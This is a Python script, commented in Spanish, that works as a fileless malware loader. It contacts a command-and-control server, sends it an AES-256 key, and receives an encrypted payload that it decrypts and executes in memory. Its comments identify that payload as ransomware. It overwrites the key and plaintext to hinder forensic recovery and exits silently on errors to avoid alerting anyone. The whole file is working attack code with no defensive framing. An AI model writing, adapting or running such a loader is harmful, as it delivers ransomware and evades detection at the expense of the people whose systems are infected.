import socket
import sys
import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configuración de conexión al C2
C2_HOST = '127.0.0.1'
C2_PORT = 5001

def secure_wipe(data):
    """Sobrescribe memoria para evitar recuperación forense"""
    if isinstance(data, bytearray):
        for i in range(len(data)):
            data[i] = 0
    elif isinstance(data, bytes):
        # Los bytes son inmutables en Python, se manejan vía recolección de basura
        pass

def execute_in_memory():
    try:
        # 1. Generar clave efímera de 32 bytes (AES-256)
        # Usamos bytearray para permitir el borrado manual posterior
        raw_key = secrets.token_bytes(32)
        ephemeral_key = bytearray(raw_key)

        # 2. Conexión al servidor C2
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_HOST, C2_PORT))

        # 3. Enviar la clave al C2 con el prefijo 'KEY:'
        # El servidor usará esta clave para cifrar el payload antes de enviarlo
        sock.send(b"KEY:" + ephemeral_key)

        # 4. Recibir el payload cifrado (Nonce 12 bytes + Ciphertext)
        encrypted_data = sock.recv(2048 * 1024)
        sock.close()

        if len(encrypted_data) < 12:
            sys.exit(0)

        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]

        # 5. Descifrar el payload en memoria
        aesgcm = AESGCM(bytes(ephemeral_key))
        plaintext_payload = aesgcm.decrypt(nonce, ciphertext, None)

        # --- INICIO DE DESTRUCCIÓN DE RASTROS EN MEMORIA ---
        secure_wipe(ephemeral_key)
        del ephemeral_key
        del aesgcm

        # 6. Compilar a Bytecode inmediatamente
        # El bytecode en RAM es más difícil de analizar que el texto plano
        compiled_code = compile(plaintext_payload.decode('utf-8'), '<string>', 'exec')

        # Borrado del texto plano de la memoria
        payload_mut = bytearray(plaintext_payload)
        secure_wipe(payload_mut)
        del plaintext_payload
        del payload_mut
        # --- FIN DE DESTRUCCIÓN DE RASTROS ---

        # 7. Ejecución del Ransomware directamente en la RAM
        # Se ejecuta en el contexto global del proceso actual
        exec(compiled_code, globals())

    except Exception as e:
        # En caso de error, salir silenciosamente para no alertar
        sys.exit(0)

if __name__ == "__main__":
    execute_in_memory()
